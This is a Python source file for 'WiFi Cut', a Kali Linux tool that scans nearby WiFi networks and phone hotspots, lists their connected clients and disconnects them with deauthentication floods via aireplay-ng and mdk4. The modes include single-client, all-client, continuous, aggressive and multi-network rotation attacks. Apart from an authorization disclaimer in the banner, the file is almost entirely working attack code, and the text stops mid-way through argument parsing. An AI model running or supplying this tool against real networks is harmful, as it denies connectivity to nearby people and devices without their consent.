#!/usr/bin/env python3
"""
WiFi Cut - WiFi scanner and deauth tool for Kali Linux
For authorized security testing, owned-network auditing, and education only.
"""

import argparse
import csv
import os
import re
import signal
import subprocess
import sys
import tempfile
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple

# ── Colors ────────────────────────────────────────────────────────────────────
R  = "\033[91m"
G  = "\033[92m"
Y  = "\033[93m"
C  = "\033[96m"
B  = "\033[94m"
W  = "\033[97m"
GR = "\033[90m"
BD = "\033[1m"
RS = "\033[0m"

BANNER = f"""
{BD}{C}╔══════════════════════════════════════════════════════════╗
║              WiFi Cut  -  Wireless Network Tool          ║
║        Scan WiFi / Hotspots  ·  Disconnect Clients       ║
╚══════════════════════════════════════════════════════════╝{RS}
{R}  ⚠  WARNING: Use only on networks you own or are authorized to test!{RS}
{R}  ⚠  Unauthorized interference is illegal in most jurisdictions.{RS}
"""


@dataclass
class Client:
    mac: str
    power: str = ""
    packets: str = ""
    bssid: str = ""


@dataclass
class Network:
    bssid: str
    channel: str
    power: str
    encryption: str
    essid: str
    clients: List[Client] = field(default_factory=list)

    @property
    def display_name(self) -> str:
        return self.essid if self.essid else "<Hidden>"


# ── Helpers ───────────────────────────────────────────────────────────────────

def run_cmd(cmd: List[str], timeout: int = 30) -> Tuple[int, str, str]:
    try:
        r = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout
        )
        return r.returncode, r.stdout, r.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "Command timed out"
    except FileNotFoundError:
        return -1, "", f"Command not found: {cmd[0]}"


def require_root():
    if os.geteuid() != 0:
        print(f"{R}Error: root privileges required. Run with sudo.{RS}")
        sys.exit(1)


def check_dependencies():
    missing = []
    for tool in ("airmon-ng", "airodump-ng", "aireplay-ng", "iw"):
        code, _, _ = run_cmd(["which", tool])
        if code != 0:
            missing.append(tool)
    if missing:
        print(f"{R}Missing dependencies: {', '.join(missing)}{RS}")
        print(f"{Y}Install on Kali: sudo apt install aircrack-ng iw{RS}")
        sys.exit(1)


WLAN_IFACE_RE = re.compile(r"^(wlan|wlx|wlp|ath|wifi)\w*$", re.I)


def is_wlan_iface(name: str) -> bool:
    return bool(WLAN_IFACE_RE.match(name))


def base_iface(iface: str) -> str:
    """wlan0mon -> wlan0"""
    if iface.endswith("mon") and len(iface) > 3 and is_wlan_iface(iface[:-3]):
        return iface[:-3]
    return iface


def iface_mode(iface: str) -> str:
    code, out, _ = run_cmd(["iw", "dev", iface, "info"])
    if code != 0:
        return "missing"
    m = re.search(r"type\s+(\w+)", out, re.I)
    return m.group(1).lower() if m else "unknown"


def get_wifi_interfaces() -> List[str]:
    """Return managed-mode interfaces for user selection (not monitor stubs)."""
    code, out, _ = run_cmd(["iw", "dev"])
    if code != 0:
        return []

    interfaces: List[str] = []
    current_iface: Optional[str] = None

    for line in out.splitlines():
        m = re.match(r"\s*Interface\s+(\w+)", line)
        if m:
            current_iface = m.group(1)
            continue
        if current_iface and re.search(r"type\s+managed", line, re.I):
            if is_wlan_iface(current_iface):
                interfaces.append(current_iface)
            current_iface = None

    if interfaces:
        return interfaces

    # Fallback: any wlan interface (e.g. already in monitor mode)
    for line in out.splitlines():
        m = re.match(r"\s*Interface\s+(\w+)", line)
        if m and is_wlan_iface(m.group(1)):
            interfaces.append(m.group(1))

    return interfaces


def find_monitor_interfaces() -> List[str]:
    """Find all interfaces currently in monitor mode."""
    code, out, _ = run_cmd(["iw", "dev"])
    if code != 0:
        return []

    candidates: List[str] = []
    current_iface: Optional[str] = None

    for line in out.splitlines():
        m = re.match(r"\s*Interface\s+(\w+)", line)
        if m:
            current_iface = m.group(1)
            continue
        if current_iface and re.search(r"type\s+monitor", line, re.I):
            if is_wlan_iface(current_iface):
                candidates.append(current_iface)
            current_iface = None

    return candidates


def resolve_monitor_iface(base: str, airmon_output: str = "") -> Optional[str]:
    """Pick the correct monitor interface; never return phy* names."""
    preferred = [f"{base}mon", base]
    monitors = find_monitor_interfaces()

    for name in preferred:
        if name in monitors:
            return name

    for name in monitors:
        if name.startswith(base):
            return name

    for name in re.findall(r"\[(\w+)\]", airmon_output):
        if is_wlan_iface(name) and (name.startswith(base) or name == f"{base}mon"):
            if iface_mode(name) == "monitor":
                return name

    for name in preferred:
        if iface_mode(name) == "monitor":
            return name

    return None


def tool_exists(name: str) -> bool:
    return run_cmd(["which", name])[0] == 0


def normalize_channel(channel: str) -> Optional[str]:
    if not channel:
        return None
    m = re.search(r"\d+", channel.strip())
    return m.group(0) if m else None


def lock_channel(mon_iface: str, channel: str) -> bool:
    ch = normalize_channel(channel)
    if not ch:
        return False
    code, _, _ = run_cmd(["iw", "dev", mon_iface, "set", "channel", ch])
    return code == 0


def is_wpa3_or_hardened(enc: str) -> bool:
    e = enc.upper()
    return "WPA3" in e or "WPA2" in e


def warn_encryption(net: Network):
    if "WPA3" in net.encryption.upper():
        print(f"{Y}  Note: WPA3 networks may use PMF — deauth can be blocked by the AP.{RS}")
        print(f"{GR}  Use aggressive mode (option 4) or test on WPA2/open networks.{RS}")


def safe_input(prompt_text: str) -> Optional[str]:
    """Read user input; return None on Ctrl+C or EOF."""
    try:
        return input(prompt_text).strip()
    except (KeyboardInterrupt, EOFError):
        print(f"\n{Y}Cancelled.{RS}")
        return None


def kill_conflicting_processes():
    print(f"{GR}Killing conflicting processes...{RS}")
    run_cmd(["airmon-ng", "check", "kill"], timeout=15)


def find_monitor_interface(original_iface: str) -> Optional[str]:
    return resolve_monitor_iface(base_iface(original_iface))


def start_monitor(iface: str) -> str:
    """Switch interface to monitor mode and return monitor interface name."""
    base = base_iface(iface)

    existing = resolve_monitor_iface(base)
    if existing:
        return existing

    kill_conflicting_processes()

    start_name = base if iface_mode(base) != "missing" else iface
    code, out, err = run_cmd(["airmon-ng", "start", start_name], timeout=20)
    combined = out + err

    mon = resolve_monitor_iface(base, combined)
    if mon:
        return mon

    print(f"{R}Failed to enable monitor mode.{RS}")
    print(f"{GR}airmon-ng output:{RS}\n{combined}")
    print(f"{Y}Run diagnostics: sudo python3 wifi_cut.py --check{RS}")
    sys.exit(1)


def stop_monitor(mon_iface: str, original_iface: str):
    print(f"{GR}Restoring interface mode...{RS}")
    base = base_iface(original_iface)
    for name in {mon_iface, original_iface, f"{base}mon", base}:
        if is_wlan_iface(name):
            run_cmd(["airmon-ng", "stop", name], timeout=15)


MAC_RE = re.compile(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")


def parse_airodump_csv(prefix: str) -> Tuple[Dict[str, Network], Dict[str, List[Client]]]:
    """Parse airodump-ng CSV output."""
    networks: Dict[str, Network] = {}
    clients_by_bssid: Dict[str, List[Client]] = {}

    ap_file = f"{prefix}-01.csv"
    if not os.path.exists(ap_file):
        return networks, clients_by_bssid

    with open(ap_file, "r", encoding="utf-8", errors="replace") as f:
        content = f.read().replace("\r\n", "\n")

    # Split AP vs station sections reliably
    station_idx = content.find("Station MAC")
    if station_idx == -1:
        ap_part = content
        station_part = ""
    else:
        ap_part = content[:station_idx]
        station_part = content[station_idx:]

    ap_lines = [l for l in ap_part.strip().splitlines() if l.strip()]
    if ap_lines:
        for row in csv.reader(ap_lines[1:]):
            if len(row) < 14:
                continue
            bssid = row[0].strip()
            if not MAC_RE.match(bssid):
                continue
            networks[bssid] = Network(
                bssid=bssid,
                channel=row[3].strip(),
                power=row[8].strip(),
                encryption=row[5].strip(),
                essid=row[13].strip(),
            )

    station_lines = [l for l in station_part.strip().splitlines() if l.strip()]
    if station_lines:
        for row in csv.reader(station_lines[1:]):
            if len(row) < 2:
                continue
            client_mac = row[0].strip()
            if not MAC_RE.match(client_mac):
                continue

            bssid = ""
            if len(row) > 5 and MAC_RE.match(row[5].strip()):
                bssid = row[5].strip()
            else:
                for cell in row[1:]:
                    cell = cell.strip()
                    if MAC_RE.match(cell):
                        bssid = cell
                        break

            if not bssid or bssid == "(not associated)":
                continue

            client = Client(
                mac=client_mac,
                power=row[3].strip() if len(row) > 3 else "",
                packets=row[4].strip() if len(row) > 4 else "",
                bssid=bssid,
            )
            bucket = clients_by_bssid.setdefault(bssid, [])
            if not any(c.mac == client_mac for c in bucket):
                bucket.append(client)

    for bssid, clients in clients_by_bssid.items():
        if bssid in networks:
            networks[bssid].clients = clients

    return networks, clients_by_bssid


def collect_clients_for_target(
    clients_by_bssid: Dict[str, List[Client]],
    networks: Dict[str, Network],
    target: Network,
) -> List[Client]:
    """Match clients by BSSID and by same ESSID (multi-AP / mesh networks)."""
    seen: Set[str] = set()
    result: List[Client] = []
    essid = target.essid.strip()
    target_ch = normalize_channel(target.channel)

    def add_client(c: Client):
        if c.mac not in seen:
            seen.add(c.mac)
            result.append(c)

    for c in clients_by_bssid.get(target.bssid, []):
        add_client(c)

    if essid:
        for bssid, clients in clients_by_bssid.items():
            net = networks.get(bssid)
            if not net or net.essid.strip() != essid:
                continue
            if target_ch and normalize_channel(net.channel) != target_ch:
                continue
            for c in clients:
                add_client(c)

    return result


def scan_networks(
    mon_iface: str,
    duration: int = 30,
    channel: Optional[str] = None,
    quiet_header: bool = False,
) -> Dict[str, Network]:
    """Scan nearby WiFi networks and connected clients."""
    tmp_dir = tempfile.mkdtemp(prefix="wificut_")
    prefix = os.path.join(tmp_dir, "scan")

    if not quiet_header:
        print(f"\n{C}Scanning wireless networks ({duration}s)...{RS}")
        if channel:
            print(f"{GR}Locked to channel {channel}{RS}")
        print(f"{GR}Includes routers, WiFi APs, and phone hotspots/tethering{RS}\n")

    ch = normalize_channel(channel or "")
    if ch:
        lock_channel(mon_iface, ch)

    cmd = [
        "airodump-ng", "--band", "abg", "--output-format", "csv",
        "--write-interval", "1", "--ignore-negative-one", "-w", prefix,
    ]
    if ch:
        cmd.extend(["-c", ch])
    # Do not use --bssid here: it hides clients on sibling APs with the same SSID
    cmd.append(mon_iface)

    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
    )

    label = f"ch{ch}" if ch else "all channels"
    best_clients: Dict[str, List[Client]] = {}
    best_networks: Dict[str, Network] = {}

    try:
        for i in range(duration):
            remaining = duration - i
            print(f"\r  {GR}Scanning {label} on {mon_iface}... {remaining:2d}s remaining{RS}", end="", flush=True)
            time.sleep(1)
            if i > 0 and i % 5 == 0:
                nets, cbs = parse_airodump_csv(prefix)
                best_networks.update(nets)
                for bk, clist in cbs.items():
                    existing = best_clients.setdefault(bk, [])
                    for c in clist:
                        if not any(x.mac == c.mac for x in existing):
                            existing.append(c)
    except KeyboardInterrupt:
        print(f"\n{Y}  Scan interrupted.{RS}")

    if proc.poll() is None:
        proc.send_signal(signal.SIGINT)
    try:
        proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        proc.kill()
        proc.wait(timeout=3)

    scan_err = ""
    if proc.stderr:
        scan_err = proc.stderr.read().decode("utf-8", errors="replace").strip()

    time.sleep(1)

    if not quiet_header:
        print(f"\r  {G}Scan complete!{RS}                         ")

    networks, clients_by_bssid = parse_airodump_csv(prefix)
    best_networks.update(networks)
    for bk, clist in clients_by_bssid.items():
        existing = best_clients.setdefault(bk, [])
        for c in clist:
            if not any(x.mac == c.mac for x in existing):
                existing.append(c)

    networks = best_networks
    clients_by_bssid = best_clients

    for bssid_key, clients in clients_by_bssid.items():
        if bssid_key in networks:
            networks[bssid_key].clients = clients

    if not networks and not quiet_header:
        if scan_err:
            print(f"{Y}  airodump-ng: {scan_err}{RS}")
        ap_file = f"{prefix}-01.csv"
        if not os.path.exists(ap_file):
            print(f"{Y}  No scan data — interface '{mon_iface}' may be invalid.{RS}")
            print(f"{Y}  Try: sudo python3 wifi_cut.py --check{RS}")

    for f in Path(tmp_dir).glob("*"):
        f.unlink(missing_ok=True)
    os.rmdir(tmp_dir)

    return networks


def discover_clients(
    mon_iface: str,
    target: Network,
    duration: int = 40,
    known_networks: Optional[Dict[str, Network]] = None,
) -> List[Client]:
    """Channel-locked scan to find clients (matches same SSID across multiple APs)."""
    ch = normalize_channel(target.channel) or target.channel
    print(f"\n{C}Discovering clients on channel {ch} ({duration}s)...{RS}")
    print(f"{GR}  Matching SSID: {target.display_name} (all APs on this channel){RS}")

    networks = scan_networks(
        mon_iface,
        duration=duration,
        channel=ch or target.channel,
        quiet_header=True,
    )
    if known_networks:
        networks.update(known_networks)

    found = collect_clients_for_target(
        {b: n.clients for b, n in networks.items() if n.clients},
        networks,
        target,
    )

    print()
    if found:
        print(f"  {G}Found {len(found)} client(s){RS}")
    else:
        print(f"  {Y}Found 0 client(s) — keep devices active on WiFi, then use option 5{RS}")
        print(f"{GR}  Tip: enterprise SSIDs use multiple APs; same-name clients may be on a sibling BSSID{RS}")
    return found


def sort_networks_list(networks: Dict[str, Network]) -> List[Network]:
    return sorted(
        networks.values(),
        key=lambda n: int(n.power) if n.power.lstrip("-").isdigit() else -999,
        reverse=True,
    )


def parse_target_selection(sel: str, sorted_nets: List[Network]) -> List[Network]:
    """Parse 3 / 1,3,5 / 2-6 / all into a list of Network targets."""
    if not sel or sel.strip() == "0":
        return []

    text = sel.strip().lower()
    if text == "all":
        return list(sorted_nets)

    indices: Set[int] = set()
    for part in re.split(r"[\s,]+", text):
        if not part:
            continue
        if "-" in part:
            bounds = part.split("-", 1)
            if len(bounds) == 2 and bounds[0].isdigit() and bounds[1].isdigit():
                start, end = int(bounds[0]), int(bounds[1])
                for i in range(min(start, end), max(start, end) + 1):
                    indices.add(i)
        elif part.isdigit():
            indices.add(int(part))

    targets: List[Network] = []
    for i in sorted(indices):
        if 1 <= i <= len(sorted_nets):
            targets.append(sorted_nets[i - 1])
    return targets


def display_multi_targets(targets: List[Network]):
    print(f"\n{BD}Selected {len(targets)} network(s):{RS}")
    print(f"{BD}{'─' * 60}{RS}")
    for i, net in enumerate(targets, 1):
        enc = net.encryption[:8] if net.encryption else "?"
        print(f"  {i}. {net.display_name}  {net.bssid}  ch{net.channel}  {enc}")
    print(f"{BD}{'─' * 60}{RS}")
    print(f"{GR}  One adapter rotates channels — each AP is attacked in turn.{RS}\n")


def deauth_burst_on_ap(
    mon_iface: str,
    bssid: str,
    channel: str,
    aggressive: bool,
    client_macs: Optional[List[str]] = None,
) -> int:
    ch = normalize_channel(channel)
    if ch:
        lock_channel(mon_iface, ch)
    burst = 64 if aggressive else 32
    total = 0
    run_aireplay_deauth(mon_iface, bssid, burst)
    total += burst
    for mac in client_macs or []:
        run_aireplay_deauth(mon_iface, bssid, 16, mac)
        total += 16
    return total


def start_mdk4_multi_bssids(
    mon_iface: str,
    targets: List[Network],
    channel: str,
) -> Optional[subprocess.Popen]:
    if not tool_exists("mdk4") or not targets:
        return None
    ch = normalize_channel(channel)
    if not ch:
        return None
    list_path = os.path.join(
        tempfile.gettempdir(), f"wificut_multi_{ch}.blacklist",
    )
    with open(list_path, "w", encoding="utf-8") as f:
        for t in targets:
            f.write(t.bssid + "\n")
    try:
        return subprocess.Popen(
            ["mdk4", mon_iface, "d", "-B", list_path, "-c", ch, "-s", "250"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except OSError:
        return None


def multi_deauth_attack(
    mon_iface: str,
    targets: List[Network],
    count: int = 0,
    aggressive: bool = False,
    dwell: float = 2.0,
    clients_map: Optional[Dict[str, List[str]]] = None,
):
    """Attack multiple APs by rotating through their channels."""
    if not targets:
        print(f"{Y}No targets selected.{RS}")
        return

    display_multi_targets(targets)
    print(f"\n{R}{BD}▶ Multi-network attack ({len(targets)} APs){RS}")
    if count == 0:
        print(f"{Y}  Mode: continuous rotation (Ctrl+C to stop){RS}")
    if aggressive:
        print(f"{GR}  Aggressive: heavy deauth + mdk4 per channel group{RS}")

    by_channel: Dict[str, List[Network]] = {}
    for t in targets:
        ch = normalize_channel(t.channel) or "0"
        by_channel.setdefault(ch, []).append(t)

    mdk4_proc: Optional[subprocess.Popen] = None
    total_sent = 0

    def stop_mdk4():
        nonlocal mdk4_proc
        if mdk4_proc and mdk4_proc.poll() is None:
            mdk4_proc.terminate()
            try:
                mdk4_proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                mdk4_proc.kill()
        mdk4_proc = None

    try:
        if count == 0:
            current_ch: Optional[str] = None
            while True:
                for target in targets:
                    ch = normalize_channel(target.channel) or "0"
                    clients = (clients_map or {}).get(target.bssid, [])
                    if aggressive and ch != current_ch:
                        stop_mdk4()
                        mdk4_proc = start_mdk4_multi_bssids(
                            mon_iface, by_channel.get(ch, [target]), ch,
                        )
                        current_ch = ch
                    total_sent += deauth_burst_on_ap(
                        mon_iface, target.bssid, target.channel, aggressive, clients,
                    )
                    label = f"{target.display_name} ch{target.channel}"
                    print(
                        f"\r  {R}Rotating → {label}  frames≈{total_sent}{RS}",
                        end="", flush=True,
                    )
                    time.sleep(dwell)
        else:
            per_target = max(32, count // max(1, len(targets)))
            for target in targets:
                ch = normalize_channel(target.channel) or "0"
                clients = (clients_map or {}).get(target.bssid, [])
                if aggressive:
                    stop_mdk4()
                    mdk4_proc = start_mdk4_multi_bssids(
                        mon_iface, by_channel.get(ch, [target]), ch,
                    )
                    time.sleep(1)
                rounds = max(1, per_target // 32)
                for _ in range(rounds):
                    total_sent += deauth_burst_on_ap(
                        mon_iface, target.bssid, target.channel, aggressive, clients,
                    )
                print(f"  {G}Attacked: {target.display_name} ({target.bssid}){RS}")
            stop_mdk4()
            print(f"{G}  Multi attack complete (~{total_sent} frames).{RS}")
    except KeyboardInterrupt:
        print(f"\n{Y}  Multi attack stopped.{RS}")
    finally:
        stop_mdk4()


def handle_multi_targets(
    mon_iface: str,
    targets: List[Network],
    networks: Dict[str, Network],
):
    while True:
        display_multi_targets(targets)
        print(f"{BD}Multi-target options:{RS}")
        print(f"  1. Continuous rotation (all selected WiFi)")
        print(f"  2. Aggressive continuous (mdk4 + flood)")
        print(f"  3. One-shot burst on each network")
        print(f"  0. Back to scan")

        opt = safe_input(f"{C}Choose action: {RS}")
        if opt is None or opt == "0":
            break
        if opt == "1":
            multi_deauth_attack(mon_iface, targets, count=0, aggressive=False)
        elif opt == "2":
            multi_deauth_attack(mon_iface, targets, count=0, aggressive=True)
        elif opt == "3":
            count_raw = safe_input(f"{C}Frames per network (default 64): {RS}")
            if count_raw is None:
                break
            count = int(count_raw) if count_raw.isdigit() else 64
            multi_deauth_attack(mon_iface, targets, count=count, aggressive=False)
        else:
            print(f"{R}Invalid option{RS}")


def display_networks(networks: Dict[str, Network]):
    if not networks:
        print(f"{Y}No WiFi networks detected. Check monitor mode support and nearby signals.{RS}")
        return

    sorted_nets = sorted(
        networks.values(),
        key=lambda n: int(n.power) if n.power.lstrip("-").isdigit() else -999,
        reverse=True,
    )

    print(f"\n{BD}{'─' * 78}{RS}")
    print(f"{BD}  {'#':<4} {'Name':<22} {'BSSID':<18} {'CH':<5} {'Signal':<6} {'Enc':<8} {'Clients'}{RS}")
    print(f"{BD}{'─' * 78}{RS}")

    for idx, net in enumerate(sorted_nets, 1):
        enc = net.encryption[:7] if net.encryption else "?"
        power = f"{net.power} dBm" if net.power else "?"
        client_count = len(net.clients)
        marker = f"{Y}📱{RS}" if any(
            kw in net.display_name.lower()
            for kw in ("iphone", "android", "huawei", "xiaomi", "oppo", "vivo", "galaxy", "hotspot")
        ) else "  "
        print(
            f"  {C}{idx:<4}{RS} {marker}{W}{net.display_name:<20}{RS} "
            f"{GR}{net.bssid:<18}{RS} {net.channel:<5} {power:<6} {enc:<8} {client_count}"
        )

    print(f"{BD}{'─' * 78}{RS}")
    print(f"{GR}  📱 = likely phone hotspot / tethering{RS}\n")


def display_clients(net: Network):
    print(f"\n{BD}Target network: {W}{net.display_name}{RS} ({net.bssid})")
    print(f"{BD}{'─' * 50}{RS}")

    if not net.clients:
        print(f"{Y}  No connected clients detected (low traffic or short scan){RS}")
        print(f"{GR}  You can still broadcast deauth frames to disconnect all clients{RS}")
        return

    print(f"  {'#':<4} {'Client MAC':<20} {'Signal':<8} {'Packets'}")
    print(f"  {'─' * 45}")
    for idx, client in enumerate(net.clients, 1):
        print(f"  {idx:<4} {client.mac:<20} {client.power:<8} {client.packets}")
    print()


def run_aireplay_deauth(
    mon_iface: str,
    bssid: str,
    count: int,
    client_mac: Optional[str] = None,
) -> Tuple[int, str, str]:
    cmd = ["aireplay-ng", "-0", str(count), "-a", bssid]
    if client_mac:
        cmd.extend(["-c", client_mac])
    cmd.append(mon_iface)
    return run_cmd(cmd, timeout=count + 15)


def start_mdk4_deauth(mon_iface: str, bssid: str, channel: str) -> Optional[subprocess.Popen]:
    if not tool_exists("mdk4"):
        return None
    ch = normalize_channel(channel)
    if not ch:
        return None
    list_path = os.path.join(tempfile.gettempdir(), f"wificut_{bssid.replace(':', '')}.blacklist")
    with open(list_path, "w", encoding="utf-8") as f:
        f.write(bssid + "\n")
    try:
        return subprocess.Popen(
            ["mdk4", mon_iface, "d", "-B", list_path, "-c", ch, "-s", "250"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except OSError:
        return None


def deauth_attack(
    mon_iface: str,
    bssid: str,
    channel: Optional[str] = None,
    client_mac: Optional[str] = None,
    count: int = 0,
    interval: float = 0.3,
    aggressive: bool = False,
    known_clients: Optional[List[str]] = None,
):
    """Send deauth/disassoc frames to disconnect clients."""
    target_desc = client_mac if client_mac else "all connected clients"
    print(f"\n{R}{BD}▶ Disconnecting: {target_desc}{RS}")
    print(f"{GR}  Target AP: {bssid}{RS}")

    ch = normalize_channel(channel or "")
    if ch:
        if lock_channel(mon_iface, ch):
            print(f"{GR}  Locked channel: {ch}{RS}")
        else:
            print(f"{Y}  Warning: could not lock channel {ch}{RS}")

    burst = 64 if aggressive else 32
    mdk4_proc: Optional[subprocess.Popen] = None

    if aggressive:
        mdk4_proc = start_mdk4_deauth(mon_iface, bssid, channel or "")
        if mdk4_proc:
            print(f"{GR}  mdk4 deauth flood active{RS}")
        elif tool_exists("mdk4"):
            print(f"{Y}  mdk4 available but could not start flood{RS}")
        else:
            print(f"{GR}  Install mdk4 for stronger attacks: sudo apt install mdk4{RS}")

    def attack_round():
        total = 0
        if client_mac:
            code, out, err = run_aireplay_deauth(mon_iface, bssid, burst, client_mac)
            total += burst
            if code != 0 and err:
                print(f"{Y}  aireplay-ng: {err.strip()}{RS}")
        else:
            code, out, err = run_aireplay_deauth(mon_iface, bssid, burst)
            total += burst
            for mac in known_clients or []:
                run_aireplay_deauth(mon_iface, bssid, 16, mac)
                total += 16
        return total

    if count == 0:
        print(f"{Y}  Mode: continuous (Ctrl+C to stop){RS}")
        total_sent = 0
        try:
            while True:
                total_sent += attack_round()
                print(f"\r  {R}Deauth frames sent (approx): {total_sent}{RS}", end="", flush=True)
                time.sleep(interval)
        except KeyboardInterrupt:
            print(f"\n{Y}  Attack stopped.{RS}")
        finally:
            if mdk4_proc:
                mdk4_proc.terminate()
                try:
                    mdk4_proc.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    mdk4_proc.kill()
    else:
        rounds = max(1, count // burst)
        print(f"{GR}  Sending ~{rounds * burst} deauth frames ({rounds} round(s)){RS}")
        for r in range(rounds):
            attack_round()
            if r < rounds - 1:
                time.sleep(interval)
        if mdk4_proc:
            time.sleep(2)
            mdk4_proc.terminate()
            try:
                mdk4_proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                mdk4_proc.kill()
        print(f"{G}  Deauth attack complete.{RS}")


def interactive_mode(mon_iface: str):
    try:
        while True:
            networks = scan_networks(mon_iface, duration=30)
            display_networks(networks)

            if not networks:
                choice = safe_input(f"{C}Scan again? (y/n): {RS}")
                if choice is None or choice.lower() != "y":
                    break
                continue

            sel = safe_input(
                f"{C}Select target # (0=quit, all, or 1,3,5 / 2-6): {RS}",
            )
            if sel is None:
                break
            if sel == "0" or not sel:
                break

            sorted_nets = sort_networks_list(networks)
            targets = parse_target_selection(sel, sorted_nets)
            if not targets:
                print(f"{R}Invalid selection — try: 3  or  1,4,7  or  2-5  or  all{RS}")
                continue

            if len(targets) > 1:
                handle_multi_targets(mon_iface, targets, networks)
                continue

            target = targets[0]

            warn_encryption(target)
            target.clients = discover_clients(
                mon_iface, target, duration=40, known_networks=networks,
            )
            display_clients(target)

            client_macs = [c.mac for c in target.clients]

            print(f"{BD}Disconnect options:{RS}")
            print(f"  1. Disconnect all clients (standard)")
            print(f"  2. Disconnect a specific client")
            print(f"  3. Continuous disconnect (until stopped)")
            print(f"  4. Aggressive disconnect (mdk4 + channel lock + flood)")
            print(f"  5. Re-scan clients (30s)")
            print(f"  0. Back to scan")

            opt = safe_input(f"{C}Choose action: {RS}")
            if opt is None:
                break

            if opt == "0":
                continue
            elif opt == "5":
                target.clients = discover_clients(
                    mon_iface, target, duration=45, known_networks=networks,
                )
                display_clients(target)
                continue
            elif opt == "1":
                count_raw = safe_input(f"{C}Deauth burst count (default 64): {RS}")
                if count_raw is None:
                    break
                count = int(count_raw) if count_raw.isdigit() else 64
                deauth_attack(
                    mon_iface, target.bssid, channel=target.channel,
                    count=count, known_clients=client_macs,
                )
            elif opt == "2":
                if not target.clients:
                    print(f"{Y}No clients detected — use option 1 or 4{RS}")
                else:
                    csel = safe_input(f"{C}Select client #: {RS}")
                    if csel is None:
                        break
                    try:
                        ci = int(csel)
                        if 1 <= ci <= len(target.clients):
                            count_raw = safe_input(f"{C}Deauth burst count (default 64): {RS}")
                            if count_raw is None:
                                break
                            count = int(count_raw) if count_raw.isdigit() else 64
                            deauth_attack(
                                mon_iface,
                                target.bssid,
                                channel=target.channel,
                                client_mac=target.clients[ci - 1].mac,
                                count=count,
                            )
                        else:
                            print(f"{R}Invalid selection{RS}")
                    except ValueError:
                        print(f"{R}Please enter a number{RS}")
            elif opt == "3":
                deauth_attack(
                    mon_iface, target.bssid, channel=target.channel,
                    count=0, known_clients=client_macs,
                )
            elif opt == "4":
                deauth_attack(
                    mon_iface, target.bssid, channel=target.channel,
                    count=0, aggressive=True, known_clients=client_macs,
                )
            else:
                print(f"{R}Invalid option{RS}")
    except KeyboardInterrupt:
        print(f"\n{Y}Interrupted.{RS}")


def run_diagnostics(iface: Optional[str] = None):
    """Print hardware/driver checks to help debug scan issues."""
    print(f"\n{BD}{C}=== WiFi Cut Diagnostics ==={RS}\n")

    print(f"{BD}[1] iw dev (wireless interfaces){RS}")
    code, out, err = run_cmd(["iw", "dev"])
    print(out or err or "(empty)")

    print(f"{BD}[2] lsusb (USB adapters){RS}")
    code, out, err = run_cmd(["lsusb"])
    print(out or err or "(empty)")

    print(f"{BD}[3] airmon-ng{RS}")
    code, out, err = run_cmd(["airmon-ng"])
    print(out or err or "(empty)")

    ifaces = get_wifi_interfaces()
    if not ifaces and iface:
        ifaces = [iface]
    if not ifaces:
        print(f"{R}No managed wireless interface found.{RS}")
        return

    test_iface = base_iface(iface or ifaces[0])
    print(f"{BD}[4] Testing monitor mode on {test_iface}{RS}")
    print(f"{GR}Current mode: {iface_mode(test_iface)}{RS}")

    kill_conflicting_processes()
    code, out, err = run_cmd(["airmon-ng", "start", test_iface], timeout=20)
    combined = out + err
    print(combined)

    mon = resolve_monitor_iface(test_iface, combined)
    if not mon:
        print(f"{R}Monitor mode FAILED — adapter may not support monitor mode.{RS}")
        print(f"{Y}Try an external adapter (e.g. Alfa AWUS036ACH).{RS}")
        return

    print(f"{G}Monitor interface: {mon}{RS}")

    lsusb_out = run_cmd(["lsusb"])[1]
    virt = run_cmd(["systemd-detect-virt"])[1].strip()
    if "VirtualBox" in lsusb_out or virt in ("oracle", "kvm", "qemu", "vmware"):
        print(f"{Y}  Note: Kali appears to run in a VM. USB WiFi passthrough may limit scanning.{RS}")
        print(f"{GR}  Prefer native Kali, or attach USB adapter via VM USB settings.{RS}")

    print(f"{BD}[5] 15-second test scan on {mon}{RS}")
    networks = scan_networks(mon, duration=15)
    count = len(networks)
    if count > 0:
        print(f"{G}Scan OK — {count} network(s) detected:{RS}")
        for i, net in enumerate(list(networks.values())[:8], 1):
            print(f"  {i}. {net.display_name}  {net.bssid}  ch{net.channel}  {net.power} dBm")
    elif "No such device" in run_cmd(["iw", "dev", mon, "info"])[2]:
        print(f"{R}Scan failed — interface {mon} not available.{RS}")
    else:
        print(f"{Y}No networks found in 15s.{RS}")
        print(f"{GR}  Try longer scan: sudo python3 wifi_cut.py --scan 30{RS}")
        print(f"{GR}  Or manual: sudo airodump-ng {mon}{RS}")

    print(f"\n{BD}[6] Restoring interface{RS}")
    for name in {mon, test_iface, f"{test_iface}mon"}:
        if is_wlan_iface(name):
            run_cmd(["airmon-ng", "stop", name], timeout=10)
    print(f"{G}Done.{RS}\n")


def main():
    parser = argparse.ArgumentParser(
        description="WiFi Cut - Kali WiFi scanner and disconnect tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 wifi_cut.py                    # interactive mode
  sudo python3 wifi_cut.py -i wlan0           # specify interface
  sudo python3 wifi_cut.py -i wlan0 --scan 30 # scan for 30 seconds
  sudo python3 wifi_cut.py -i wlan0 -b AA:BB:CC:DD:EE:FF --deauth-all
  sudo python3 wifi_cut.py -i wlan0 --bssids AA:BB:...,11:22:... --multi-deauth --continuous
  sudo python3 wifi_cut.py --check              # diagnose scan issues
        """,
    )
    parser.add_argument("-i", "--interface", help="Wireless interface (e.g. wlan0)")
    parser.add_argument("--check", action="store_true", help="Run diagnostics (no attack)")
    parser.add_argument("--scan", type=int, default=30, metavar="SEC", help="Scan duration in seconds")
    parser.add_argument("--channel", help="Lock scan/attack to channel (e.g. 6)")
    parser.add_argument("--aggressive", action="store_true", help="Use mdk4 flood + heavy deauth")
    parser.add_argument("-b", "--bssid", help="Target AP BSSID")
    parser.add_argument(
        "--bssids",
